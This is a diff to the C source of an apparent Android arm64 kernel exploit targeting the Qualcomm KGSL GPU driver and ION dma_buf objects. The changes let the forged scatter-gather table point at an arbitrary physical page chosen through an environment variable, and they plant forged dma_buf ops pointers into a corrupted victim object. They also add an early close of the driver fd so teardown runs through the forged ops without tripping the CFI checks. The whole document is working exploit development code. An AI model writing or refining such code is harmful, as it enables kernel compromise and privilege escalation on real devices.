@@ -1316,11 +1316,22 @@ int try_cfi_stage(void) {
                     uint32_t one = 1;
                     configfs_write_once(fd, GT + 0x08, &one, 4);      /* nents */
                     configfs_write_once(fd, GT + 0x0c, &one, 4);      /* orig_nents */
-                    /* struct page* of the victim object's own (slab) page.
-                     * arm64: virt_to_page(k) = VMEMMAP_START |
-                     *   ((k & ~PAGE_OFFSET)/PAGE_SIZE*sizeof(struct page)),
-                     * i.e. page = VMEMMAP_START + ((A-PAGE_OFFSET)>>12)*0x40. */
-                    uint64_t pfn = ((uint64_t)A - (uint64_t)P0_PAGE_OFFSET) >> 12;
+                    /* struct page* of the target physical page.
+                     * pfn_to_page(pfn) = VMEMMAP_START - (ms>>12) + pfn, so for a
+                     * raw phys: page = VMEMMAP_START + ((phys-ms)>>12)*0x40.
+                     * Default target = the victim object's own (slab) page. */
+                    uint64_t pfn;
+                    const char *sp = getenv("KGSL_SGT_PHYS");
+                    if (sp && *sp) {
+                      uint64_t tp = strtoull(sp, NULL, 0), msr = 0;
+                      configfs_read_once(fd, data_addr(MEMSTART_ADDR), &msr, 8);
+                      if (!msr) msr = 0x80000000ULL;
+                      pfn = (tp - msr) >> 12;
+                      pr_info("kgsl_drm: SGT_PHYS=%016zx ms=%016zx pfn=%08zx\n",
+                              (size_t)tp, (size_t)msr, (size_t)pfn);
+                    } else {
+                      pfn = ((uint64_t)A - (uint64_t)P0_PAGE_OFFSET) >> 12;
+                    }
                     uint64_t page = vs + pfn * 0x40;
                     uint64_t pl = page | 2;                          /* |SG_END */
                     uint32_t ofs = 0, len = 0x1000; uint64_t da = 0; uint32_t dl = 0;
@@ -1333,8 +1344,12 @@ int try_cfi_stage(void) {
                     configfs_write_once(fd, A + 0xa0, &FB, 8);    /* dma_buf.priv? */
                     uint64_t ia = (uint64_t)data_addr(ION_DMA_BUF_ATTACH);
                     uint64_t im = (uint64_t)data_addr(ION_MAP_DMA_BUF);
-                    configfs_write_once(fd, ot + 0x00, &ia, 8);
-                    configfs_write_once(fd, ot + 0x10, &im, 8);
+                    uint64_t id = (uint64_t)data_addr(ION_DMA_BUF_DETACH);
+                    uint64_t iu = (uint64_t)data_addr(ION_UNMAP_DMA_BUF);
+                    configfs_write_once(fd, ot + 0x00, &ia, 8);   /* attach */
+                    configfs_write_once(fd, ot + 0x08, &id, 8);   /* detach */
+                    configfs_write_once(fd, ot + 0x10, &im, 8);   /* map_dma_buf */
+                    configfs_write_once(fd, ot + 0x18, &iu, 8);   /* unmap_dma_buf */
                     pr_info("kgsl_drm: SGT page=%016zx page_link=%016zx attach=%016zx map=%016zx\n",
                             (size_t)page, (size_t)pl, (size_t)ia, (size_t)im);
                   } else {
@@ -1390,6 +1405,12 @@ int try_cfi_stage(void) {
                   int rr = ioctl(gfd, IOCTL_KGSL_MAP_USER_MEM_, &m);
                   pr_info("kgsl_drm: ioctl ret=%d errno=%d\n", rr, errno);
                   fsync(1);
+                  /* Run KGSL's mem-entry teardown NOW, while the forged ops is
+                   * still in place (kgsl_release -> kgsl_mem_entry_destroy ->
+                   * kgsl_destroy_ion -> dma_buf_unmap_attachment).  Otherwise the
+                   * deferred teardown at do_exit() dispatches through the
+                   * restored object and CFI-faults. */
+                  if (gfd >= 0) { close(gfd); pr_info("kgsl_drm: closed kgsl fd (teardown ran)\n"); fsync(1); }
                 }
                 /* restore the victim object so closing the fd doesn't crash */
                 if (A_saved) {
